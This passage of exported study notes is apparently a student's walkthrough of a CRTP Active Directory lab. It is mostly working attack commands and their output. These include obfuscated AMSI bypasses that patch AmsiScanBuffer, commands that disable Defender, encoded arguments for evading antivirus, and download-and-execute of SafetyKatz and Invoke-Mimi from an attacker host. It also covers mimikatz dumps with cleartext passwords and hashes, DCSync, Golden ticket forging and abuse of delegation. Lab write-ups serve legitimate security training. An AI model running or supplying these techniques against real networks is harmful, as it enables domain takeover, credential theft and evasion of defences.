dcorp-mgmt:\n\n```\n$null | winrs -r:dcorp-mgmt \"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.222\"\n```\n\nnote that we have to use the $null variable to address output redirection issues.\n\nNote that Windows Defender on dcorp-mgmt would detect SafetKatz execution even when used with Loader. To avoid that, let's pass encoded arguments to the Loader\n\n```\nArgSplit.bat\n```\n\n```\nC:\\Users\\student222>cd C:\\AD\\Tools\n\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: sekurlsa::ekeys\nset \"z=s\"\nset \"y=y\"\nset \"x=e\"\nset \"w=k\"\nset \"v=e\"\nset \"u=:\"\nset \"t=:\"\nset \"s=a\"\nset \"r=s\"\nset \"q=l\"\nset \"p=r\"\nset \"o=u\"\nset \"n=k\"\nset \"m=e\"\nset \"l=s\"\nset \"Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\nC:\\AD\\Tools>\n```\n\n\nInclude the above output and other arguments in a batch file. Below are the contents of the batch file. It is also present in the C:\\AD\\Tools directory of our student VM as **Safety.bat**\n\n```\n@echo off\nset \"z=s\"\nset \"y=y\"\nset \"x=e\"\nset \"w=k\"\nset \"v=e\"\nset \"u=:\"\nset \"t=:\"\nset \"s=a\"\nset \"r=s\"\nset \"q=l\"\nset \"p=r\"\nset \"o=u\"\nset \"n=k\"\nset \"m=e\"\nset \"l=s\"\nset \"Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\necho %Pwn%\nC:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn% exit\n```\n\n\n![](https://i.imgur.com/JOKtDJe.png)\n\nDownload the batch file on dcorp-ci. Run the below commands on the reverse shell:\n\n```\niwr http://172.16.100.222/Safety.bat -OutFile C:\\Users\\Public\\Safety.bat\n```\n\nNow, copy the Safety.bat to dcorp-mgmt:\n\n```\necho F | xcopy C:\\Users\\Public\\Safety.bat \\\\dcorp-mgmt\\C$\\Users\\Public\\Safety.bat\n```\n\n\nRun Safety.bat on dcorp-mgmt that use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt:\n\n```\n$null | winrs -r:dcorp-mgmt \"cmd /c C:\\Users\\Public\\Safety.bat\"\n```\n\n\n\n```\nmimikatz(commandline) # sekurlsa::ekeys\n\nAuthentication Id : 0 ; 56461 (00000000:0000dc8d)\nSession           : Service from 0\nUser Name         : svcadmin\nDomain            : dcorp\nLogon Server      : DCORP-DC\nLogon Time        : 2/20/2024 3:22:38 AM\nSID               : S-1-5-21-719815819-3726368948-3917688648-1118\n\n         * Username : svcadmin\n         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n         * Password : *ThisisBlasphemyThisisMadness!!\n         * Key List :\n           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011\n           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd\n           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8\n           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8\n           rc4_md4           b38ff50264b74508085d82c69794a4d8\n           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8\n           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\n```\n\n\n![](https://i.imgur.com/QSrwdPz.jpeg)\n\n\nSweet! We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see \"Session\" in the above output), so you can even get credentials in clear-text from lsasecrets!\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n------------------------------------\n\n\n## Using Powershell Remoting \n\nCheck if we can run commands on dcorp-mgmt using PowerShell remoting.\n\n```\nInvoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt\n```\n\nNow, let's use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin \"svcadmin\". Host Invoke-Mimi.ps1 on your studentx machine and run the below command on the reverse shell:\n\n```\niex (iwr http://172.16.100.222/Invoke-Mimi.ps1 -UseBasicParsing)\n```\n\n\nNow, to use Invoke-Mimi on dcorp-mgmt, we must disable AMSI there. Please note that we can use the AMSI bypass we have been using or the built-in Set-MpPrefernce as well because we have administrative access on dcorp-mgmt:\n\n```\n$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local\n```\n\n```\nInvoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess\n```\n\n```\nInvoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess}\n```\n\n\n\n\n------------------------------\n\n\nLOGIN To srvadmin\n\n```\nC:\\Windows\\system32>**echo %Pwn%**\nasktgt\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n```\n\n\n![](https://i.imgur.com/vICTIXo.png)\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/06-Applocker & Constrained Language Mode",
    "path": "02-CRTP/06-Applocker & Constrained Language Mode.md",
    "title": "06 Applocker & Constrained Language Mode",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "We have local admin on the dcorp-adminsrv. You will notice that any attempt to run Loader.exe (to run SafetKatz from memory) results in error 'This program is blocked by group policy. For more informa...",
    "category": "02-CRTP",
    "content": "We have local admin on the dcorp-adminsrv. You will notice that any attempt to run Loader.exe (to run SafetKatz from memory) results in error 'This program is blocked by group policy. For more information, contact your system administrator'. Any attempts to run Invoke-Mimi on dcorp-adminsrv results in errors about language mode. This could be because of an application allolist on dcorp-adminsrv and we drop into a Constrained Language Mode (CLM) when using PSRemoting.\n\n\n\n\nLet's check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute:\n\n```\nwinrs -r:dcorp-adminsrv cmd\n```\n\n```\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SRPV2\n```\n\n\nLooks like Applocker is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else. However, this particular rule is overly permissive!\n\n```\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SRPV2\\Script\\06dce67b-934c-454f-a263-2515c8796a5d\n```\n\n![](https://i.imgur.com/dRO1LtS.png)\n\n\nA default rule is enabled that allows everyone to run scripts from the C:\\ProgramFiles folder!\n\n\n\n\n\n\n--------------------------------------\n## Powershell \nWe can also confirm this using PowerShell commands on dcrop-adminsrv. Run the below commands from a PowerShell session as studentx:\n\n```\nEnter-PSSession dcorp-adminsrv\n```\n\n```\n$ExecutionContext.SessionState.LanguageMode\n```\n\n```\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n```\n\n![](https://i.imgur.com/1AotiyE.png)\n\n\nHere, Everyone can run scripts from the Program Files directory. That means, we can drop scripts in the Program Files directory there and execute them. But, we first need to disable Windows Defender on the dcorp-adminsrv server:\n\nTurn off defender\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true -Verbose\n```\n\nAlso, we cannot run scripts using dot sourcing (. .\\Invoke-Mimi.ps1) because of the Constrained Language Mode. So, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server.\n\n**Create Invoke-MimiEx.ps1**\n\n- Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1.\n- Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit).\n- Add \"Invoke-Mimi -Command '\"sekurlsa::ekeys\"' \" (without quotes) to the end of the file\n\nOn student machine run the following command from a PowerShell session\n\n```\nCopy-Item C:\\AD\\Tools\\Invoke-MimiEx.ps1 \\\\dcorp-adminsrv.dollarcorp.moneycorp.local\\c$\\'Program Files'\n```\n\n![](https://i.imgur.com/sbok7OA.png)\n\n\n\n```\nmimikatz(powershell) # sEKurlSa::EkEyS\n\nAuthentication Id : 0 ; 261640 (00000000:0003fe08)\nSession           : RemoteInteractive from 2\nUser Name         : srvadmin\nDomain            : dcorp\nLogon Server      : DCORP-DC\nLogon Time        : 2/20/2024 3:30:32 AM\nSID               : S-1-5-21-719815819-3726368948-3917688648-1115\n\n         * Username : srvadmin\n         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n         * Password : (null)\n         * Key List :\n           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4\n           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728\n           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728\n           rc4_md4           a98e18228819e8eec3dfa33cb68b0728\n           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728\n           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728\n\nAuthentication Id : 0 ; 91900 (00000000:000166fc)\nSession           : Service from 0\nUser Name         : websvc\nDomain            : dcorp\nLogon Server      : DCORP-DC\nLogon Time        : 2/20/2024 3:22:39 AM\nSID               : S-1-5-21-719815819-3726368948-3917688648-1114\n\n         * Username : websvc\n         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n         * Password : AServicewhichIsNotM3@nttoBe\n         * Key List :\n           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7\n           aes128_hmac       86a353c1ea16a87c39e2996253211e41\n           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f\n           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f\n           rc4_md4           cc098f204c5887eaa8253e7c2749156f\n           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f\n           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f\n\nAuthentication Id : 0 ; 91874 (00000000:000166e2)\nSession           : Service from 0\nUser Name         : appadmin\nDomain            : dcorp\nLogon Server      : DCORP-DC\nLogon Time        : 2/20/2024 3:22:39 AM\nSID               : S-1-5-21-719815819-3726368948-3917688648-1117\n\n         * Username : appadmin\n         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n         * Password : *ActuallyTheWebServer1\n         * Key List :\n           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb\n           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e\n           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7\n           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7\n           rc4_md4           d549831a955fee51a43c83efb3928fa7\n           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7\n           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7\n```\n\n\n\n```\nC:\\Windows\\system32> **C:\\AD\\Tools\\ArgSplit.bat**\n[!] Argument Limit: 180 characters\n[+] Enter a string:  **asktgt**\nset \"z=t\"\nset \"y=g\"\nset \"x=t\"\nset \"w=k\"\nset \"v=s\"\nset \"u=a\"\nset \"Pwn=%u%%v%%w%%x%%y%%z%\"\n```\n\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n```\n\n![](https://i.imgur.com/iNtTTAT.png)\n\n\nWe have local admin access on the dcorp-mgmt server as srvadmin and we already know a session of svcadmin is present on that machine.\n\n\n**SafetyKatz for extracting credentials**\n\nLet's use SafetyKatz to extract credentials from the machine. Run the below commands from the process running as srvadmin.\n\nCopy the Loader.exe and Safety.bat to dcorp-mgmt:\n\n```\necho F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorp-mgmt\\C$\\Users\\Public\\Loader.exe\n```\n\n```\necho F | xcopy C:\\AD\\Tools\\Safety.bat \\\\dcorp-mgmt\\C$\\Users\\Public\\Safety.bat\n```\n\n```\nwinrs -r:dcorp-mgmt C:\\Users\\Public\\Safety.bat\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/06-Bloodhount",
    "path": "02-CRTP/06-Bloodhount.md",
    "title": "06 Bloodhount",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "BloodHound ingestores to gather data and information about the current domain. Note that we are byassping .NET AMSI before running SharpHound.ps1 using the following code ` $ZQCUW = @\" using System; u...",
    "category": "02-CRTP",
    "content": "\nBloodHound ingestores to gather data and information about the current domain. Note that we are byassping .NET AMSI before running SharpHound.ps1 using the following code\n\n```\n\n$ZQCUW = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class ZQCUW {\n [DllImport(\"kernel32\")]\n public static extern IntPtr GetProcAddress(IntPtr hModule, string\nprocName);\n [DllImport(\"kernel32\")]\n public static extern IntPtr LoadLibrary(string name);\n [DllImport(\"kernel32\")]\n public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr\ndwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type $ZQCUW\n$BBWHVWQ =\n[ZQCUW]::LoadLibrary(\"$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))\")\n$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,\n\"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))\")\n$p = 0\n[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)\n$TLML = \"0xB8\"\n$PURX = \"0x57\"\n$YNWL = \"0x00\"\n$RTGX = \"0x07\"\n$XVON = \"0x80\"\n$WRUD = \"0xC3\"\n$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)\n[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)\n\n```\n\n\n\n```\n$ZQCUW = @\"[snip .NET AMSI bypass]\n```\n\n```\n. .\\SharpHound.ps1\n```\n\n\n```\nInvokeBloodHound -CollectionMethod All\n```\n\nOr \n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat \n```\n\n```\ncurl http://172.16.99.22/SharpHound.exe -O SharpHound.exe\n```\n\n```\n.\\SharpHound.exe --CollectionMethods All\n```\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/07-extracting credentials from credentials vault",
    "path": "02-CRTP/07-extracting credentials from credentials vault.md",
    "title": "07 Extracting Credentials From Credentials Vault",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "` SeT-Item ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( TYpE )  ;    (    Get-varIABLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"AssEmbly\".\"GETTYPe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('A...",
    "category": "02-CRTP",
    "content": "\n\n```\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\n\nDownload and Execute Invoke-Mimiatz as follows:\n\n```\niex (iwr http://172.16.100.222/Invoke-Mimi.ps1 -UseBasicParsing)\n```\n\n```\nInvoke-Mimi -Command '\"sekurlsa::ekeys\"'\n```\n\n\n![](https://i.imgur.com/gjjh3V9.jpeg)\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/08-KRBTGT & dcsync",
    "path": "02-CRTP/08-KRBTGT & dcsync.md",
    "title": "08 KRBTGT & Dcsync",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Using the secrets of krbtgt accoun - Extract secrets from the domain controller of dollarcorp. - Using the secrets of krbtgt account, create a Golden ticket. - Use the Golden ticket to (once again) ge...",
    "category": "02-CRTP",
    "content": "## Using the secrets of krbtgt accoun\n\n\n- Extract secrets from the domain controller of dollarcorp.\n- Using the secrets of krbtgt account, create a Golden ticket.\n- Use the Golden ticket to (once again) get domain admin privileges from a machine\n\nFrom the previous exercise, we have domain admin privileges! Let's use extract all the hashes on the domain controller. Remember that the commands need to be executed from a process running with privileges of DA on your student VM.\n\n**Using Rubeus**\n\nRun the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:\n\n```\necho F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorpdc\\C$\\Users\\Public\\Loader.exe /Y\n```\n\n```\nwinrs -r:dcorp-dc cmd\n```\n\n\n```\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.222\n```\n\n```\nnetsh interface portproxy show all\n```\n\n![](https://i.imgur.com/qZEXlwX.png)\n\n\nUse ArgSplit.bat on the student VM to encode \"lsadump::lsa\":\n\n\n```\nC:\\AD\\Tools>C:\\AD\\Tools\\ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: lsadump::lsa\nset \"z=a\"\nset \"y=s\"\nset \"x=l\"\nset \"w=:\"\nset \"v=:\"\nset \"u=p\"\nset \"t=m\"\nset \"s=u\"\nset \"r=d\"\nset \"q=a\"\nset \"p=s\"\nset \"o=l\"\nset \"Pwn=%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\n```\n\n``\nCopy the generated commands and use it on the winrs session on dcorp-dc:\n\n```\nC:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args \"%Pwn% /patch\" \"exit\"\n```\n\n![](https://i.imgur.com/GUcJUz1.png)\n\n## HASH \n\n```\nmimikatz(commandline) # lsadump::lsa /patch\nDomain : dcorp / S-1-5-21-719815819-3726368948-3917688648\n\nRID  : 000001f4 (500)\nUser : Administrator\nLM   :\nNTLM : af0686cc0ca8f04df42210c9ac980760\n\nRID  : 000001f5 (501)\nUser : Guest\nLM   :\nNTLM :\n\nRID  : 000001f6 (502)\nUser : krbtgt\nLM   :\nNTLM : 4e9815869d2090ccfca61c1fe0d23986\n\nRID  : 00000459 (1113)\nUser : sqladmin\nLM   :\nNTLM : 07e8be316e3da9a042a9cb681df19bf5\n\nRID  : 0000045a (1114)\nUser : websvc\nLM   :\nNTLM : cc098f204c5887eaa8253e7c2749156f\n\nRID  : 0000045b (1115)\nUser : srvadmin\nLM   :\nNTLM : a98e18228819e8eec3dfa33cb68b0728\n\nRID  : 0000045d (1117)\nUser : appadmin\nLM   :\nNTLM : d549831a955fee51a43c83efb3928fa7\n\nRID  : 0000045e (1118)\nUser : svcadmin\nLM   :\nNTLM : b38ff50264b74508085d82c69794a4d8\n\nRID  : 0000045f (1119)\nUser : testda\nLM   :\nNTLM : a16452f790729fa34e8f3a08f234a82c\n\nRID  : 00000460 (1120)\nUser : mgmtadmin\nLM   :\nNTLM : 95e2cd7ff77379e34c6e46265e75d754\n\nRID  : 00000461 (1121)\nUser : ciadmin\nLM   :\nNTLM : e08253add90dccf1a208523d02998c3d\n\nRID  : 00000462 (1122)\nUser : sql1admin\nLM   :\nNTLM : e999ae4bd06932620a1e78d2112138c6\n\nRID  : 00001055 (4181)\nUser : studentadmin\nLM   :\nNTLM : d1254f303421d3cdbdc4c73a5bce0201\n```\n\nPlease note that the krbtgt account password may be changed and the hash you get in your lab instance could be different from the one in this lab manual.\n\n## dcsync\n\n\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: lsadump::dcsync\nset \"z=c\"\nset \"y=n\"\nset \"x=y\"\nset \"w=s\"\nset \"v=c\"\nset \"u=d\"\nset \"t=:\"\nset \"s=:\"\nset \"r=p\"\nset \"q=m\"\nset \"p=u\"\nset \"o=d\"\nset \"n=a\"\nset \"m=s\"\nset \"l=l\"\nset \"Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\n```\n\n\nTo get NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack. Run the below command from process running as Domain Admin on the student VM. We are using encoded argument for \"lsadump::dcsync\"\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\\krbtgt\" \"exit\"\n```\n\n\n![](https://i.imgur.com/O0RvltV.jpeg)\n\n\n\nUse the below Rubeus command to generate an OPSEC friendly command for Golden ticket. Note that 3 LDAP queries are sent to the DC to retrieve the required information. We will once again use ArgsSplit.bat to encode \"golden\":\n\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: golden\nset \"z=n\"\nset \"y=e\"\nset \"x=d\"\nset \"w=l\"\nset \"v=o\"\nset \"u=g\"\nset \"Pwn=%u%%v%%w%%x%%y%%z%\"\nC:\\AD\\Tools>\n```\n\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd\n```\n\n```\nadministrator SID : S-1-5-21-719815819-3726368948-3917688648\n```\n\n![](https://i.imgur.com/4MBQ9tr.jpeg)\n\n\nNow, use the generated command to forge a Golden ticket. Remember to add /ptt at the end of the generated command to inject it in the current process. Once the ticket is injected, we can access resources in the domain. Note that we will once again use Loader.exe and ArgsSplit.bat to encode \"golden\" :\n\n```\nC:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"\n```\n\n```\nC:\\AD\\Tools\\SafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"\n```\n\n\n\n\n------------------------------------------------------\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/10-DCSync rights",
    "path": "02-CRTP/10-DCSync rights.md",
    "title": "10 DCSync Rights",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "We can check if studentx has replication rights using the following commands: ` C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat   ` ` . C:\\AD\\Tools\\PowerView.ps1  ` ` Get-DomainObjectAcl -SearchBase...",
    "category": "02-CRTP",
    "content": "\nWe can check if studentx has replication rights using the following commands:\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat  \n```\n\n```\n. C:\\AD\\Tools\\PowerView.ps1 \n```\n\n```\nGet-DomainObjectAcl -SearchBase \"DC=dollarcorp,DC=moneycorp,DC=local\" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match \"student222\"}\n```\n\nIf the student222 does not have replication rights, let's add the rights. Start a process as Domain Administrator by running the below comman from an elevated command prompt:\n\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: asktgt\nset \"z=t\"\nset \"y=g\"\nset \"x=t\"\nset \"w=k\"\nset \"v=s\"\nset \"u=a\"\nset \"Pwn=%u%%v%%w%%x%%y%%z%\"\n```\n\n```\necho %Pwn%\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n```\n\nRun the below commands in the new process. Remember to change student222 to your user:\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat  \n```\n\n```\n. C:\\AD\\Tools\\PowerView.ps1 \n```\n\n```\nAdd-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student222 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose\n```\n\n![](https://i.imgur.com/xzazqBO.jpeg)\n\n\nLet's check for the rights once again from a normal shell:\n\n\n\n\n\n\n\n\n\n-------------------\n\n```\necho F | xcopy C:\\AD\\Tools\\PowerView.ps1 \\\\dcorp-dc\\C$\\Users\\Public\\PowerView.ps1  /Y\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/11-Unconstrained Delegation is enabled.",
    "path": "02-CRTP/11-Unconstrained Delegation is enabled..md",
    "title": "11 Unconstrained Delegation Is Enabled.",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "` C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat   ` ` . C:\\AD\\Tools\\PowerView.ps1  ` ` Get-DomainComputer -Unconstrained | select -ExpandProperty name ` Since the prerequisite for elevation using ...",
    "category": "02-CRTP",
    "content": "\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat  \n```\n\n```\n. C:\\AD\\Tools\\PowerView.ps1 \n```\n\n```\nGet-DomainComputer -Unconstrained | select -ExpandProperty name\n```\n\nSince the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let's check if anyone of them have local admin privileges on dcorp-appsrv.\n\nirst, we will try with appadmin. Run the below command from an elevated command prompt:\n\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: asktgt\nset \"z=t\"\nset \"y=g\"\nset \"x=t\"\nset \"w=k\"\nset \"v=s\"\nset \"u=a\"\nset \"Pwn=%u%%v%%w%%x%%y%%z%\"\n```\n\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n```\n\n![](https://i.imgur.com/PWskBnw.png)\n\nSweet! We can use multiple methods now to copy Rubeus to dcorp-appsrv to abuse Printer Bug!\n\n```\necho F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorp-appsrv\\C$\\Users\\Public\\Loader.exe /Y\n```\n\nRun Rubeus in listener mode. Remember to run ArgSplit on the student VM to encode \"monitor\" and then run the generated commands in the winrs session on dcorp-appsrv:\n\n```\nwinrs -r:dcorp-appsrv cmd\n```\n\n\n```\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.222\n```\n\n```\nPS C:\\AD\\Tools> .\\ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: monitor\nset \"z=r\"\nset \"y=o\"\nset \"x=t\"\nset \"w=i\"\nset \"v=n\"\nset \"u=o\"\nset \"t=m\"\nset \"Pwn=%t%%u%%v%%w%%x%%y%%z%\"\n```\n\n```\nC:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:DCORP-DC$ /interval:5 /nowrap \n```\n\nor \n\n```\nC:\\Users\\Public\\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap\n```\n\nOn the student VM, use MS-RPRN to force authentication from dcorp-dc$\n\n```\nC:\\AD\\Tools\\MS-RPRN.exe \\\\dcorp-dc.dollarcorp.moneycorp.local 